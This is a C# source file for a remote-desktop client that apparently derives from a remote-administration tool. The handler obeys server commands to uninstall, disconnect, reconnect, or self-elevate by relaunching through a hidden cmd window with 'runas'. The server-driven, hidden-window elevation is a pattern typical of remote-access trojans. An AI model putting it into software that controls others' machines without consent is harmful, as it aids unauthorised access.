using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Enums;
using FKRemoteDesktop.Framework;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Install;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Structs;
using FKRemoteDesktop.Utilities;
using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Message.SubMessageHandler
{
    public class ClientServicesHandler : IMessageProcessor
    {
        private readonly FKClient _client;
        private readonly ClientForm _clientForm;

        public ClientServicesHandler(ClientForm clientForm, FKClient client)
        {
            _clientForm = clientForm;
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                             message is DoClientDisconnect ||
                                                             message is DoClientReconnect ||
                                                             message is DoAskElevate;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoClientUninstall msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoClientUninstall");
                    Execute(sender, msg);
                    break;

                case DoClientDisconnect msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoClientDisconnect");
                    Execute(sender, msg);
                    break;

                case DoClientReconnect msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoClientReconnect");
                    Execute(sender, msg);
                    break;

                case DoAskElevate msg:
                    Logger.Log(ELogType.eLogType_Debug, "收到服务器消息: DoAskElevate");
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            try
            {
                new ClientUninstaller().Uninstall();
                _client.Exit();
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"客户端卸载失败: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            Thread.Sleep(1000);
            _client.Exit();
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            _client.Disconnect();
        }

        private void Execute(ISender client, DoAskElevate message)
        {
            var userAccount = new SUserAccount();
            if (userAccount.Type != EAccountType.eAccountType_Admin)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                _clientForm.ApplicationMutex.Dispose();  // 关闭mutex，以便新进程顺利运行
                try
                {
                    ProcessHelper.StartProcess(startInfo);
                }
                catch
                {
                    client.Send(new SetStatus { Message = "用户拒绝了权限提升请求." });
                    _clientForm.ApplicationMutex = new SingleInstanceMutex(SettingsFromServer.MUTEX);  // 重新上锁
                    return;
                }
                _client.Exit();
            }
            else
            {
                client.Send(new SetStatus { Message = "进程权限已提升." });
            }
        }
    }
}